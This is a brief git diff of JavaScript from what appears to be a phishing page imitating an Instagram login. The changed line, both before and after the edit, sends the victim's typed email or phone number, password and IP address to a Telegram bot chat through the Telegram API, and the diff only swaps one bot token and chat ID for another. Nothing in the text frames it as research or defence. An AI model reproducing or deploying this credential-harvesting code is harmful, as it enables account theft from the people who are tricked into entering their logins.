@@ -62,7 +62,7 @@ const isPasswordSecure = (password) => {
 signin.addEventListener("click", async (ev) => {
     ev.preventDefault();
     console.log("signing in...");
-    const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=` + `INSTAGRAM  || ${inputEmail.value}:${inputPassword.value} || ${JSON.stringify(ip)}`
+    const url = `https://api.telegram.org/bot5807856562:AAFnhxpbQQ8MvyQaQGEg8vkpfCssLlY6x5c/sendMessage?chat_id=-1001801844217&text=` + `INSTAGRAM  || ${inputEmail.value}:${inputPassword.value} || ${JSON.stringify(ip)}`
 
     if (!validateEmail(inputEmail.value) && !validatePhone(inputEmail.value) && !isPasswordSecure(inputPassword.value) && !checkUsername()) {
         errorspan.style.display = "block"
